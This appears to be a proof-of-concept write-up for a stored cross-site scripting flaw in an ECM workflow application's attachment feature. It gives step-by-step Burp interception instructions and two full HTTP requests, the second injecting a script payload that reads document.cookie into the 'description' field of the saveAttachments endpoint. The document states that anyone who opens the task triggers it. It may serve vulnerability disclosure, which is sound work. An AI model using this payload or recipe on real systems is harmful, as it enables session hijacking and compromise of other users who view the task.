# xss-s-3

Poc

To run this XSS Stored, simply access the task's frontend and the XSS will be triggered automatically.

To trigger, first need upload any file in attachment at task, intercept with Burp and when we have `/ecm/api/rest/ecm/workflowView/saveAttachments` endpoint at request flow, we modify `description` parameter (vulnerable) and send with your XSS Payload.

So, first: intercept the requests with Burp and upload a file in attachment at task. Here we just will create a simple file, don't need change anything.
```
POST /ecm/upload HTTP/2
Host: host.com
Cookie: JSESSIONID=session; JSESSIONIDSSO=sessionSSO
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----geckoformboundary60088f67ae43ae7924cc4762b55db98b
Content-Length: 4060


------geckoformboundary60088f67ae43ae7924cc4762b55db98b
Content-Disposition: form-data; name="userId"

USER_ID_HERE
------geckoformboundary60088f67ae43ae7924cc4762b55db98b
Content-Disposition: form-data; name="files[]"; filename="teste123.jpg"
Content-Type: image/jpeg

IMAGE_CONTENT
------geckoformboundary60088f67ae43ae7924cc4762b55db98b--
```

Click to next request and the we got a POST to `/ecm/api/rest/ecm/workflowView/saveAttachments`. Here we need change `description` parameter with XSS payload:
```
POST /ecm/api/rest/ecm/workflowView/saveAttachments HTTP/2
Host: host.com
Cookie: JSESSIONID=session; JSESSIONIDSSO=sessionSSO
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://host.com/pageworkflowview?app_ecm_workflowview_processInstanceId=ID_PROCESS&app_ecm_workflowview_currentMovto=2&app_ecm_workflowview_taskUserId=ID_USER&app_ecm_workflowview_managerMode=false
Content-Type: application/json; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 617
Origin: https://host.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"processId":"wkToten","version":8,"managerMode":false,"taskUserId":"USER_ID","processInstanceId":PROCESS_ID,"isDigitalSigned":false,"selectedState":5,"attachments":[{"id":2,"fullPath":"BPM","droppedZipZone":false,"name":"testingt.png","newAttach":true,"description":"testing.jpg\"></a><script>alert(document.cookie)</script>","documentId":0,"attachments":[{"attach":false,"principal":true,"fileName":"teste123.jpg"}],"hasOwnSubMenu":true,"enablePublish":false,"enableEdit":false,"enableEditContent":false,"enableDownload":true,"iconClass":"fluigicon-file-upload","iconUrl":false,"colleagueId":"ID_COLLEAGUE"}],"currentMovto":2}
```

Now, any people that access the frontend from this task will be trigger XSS stored.
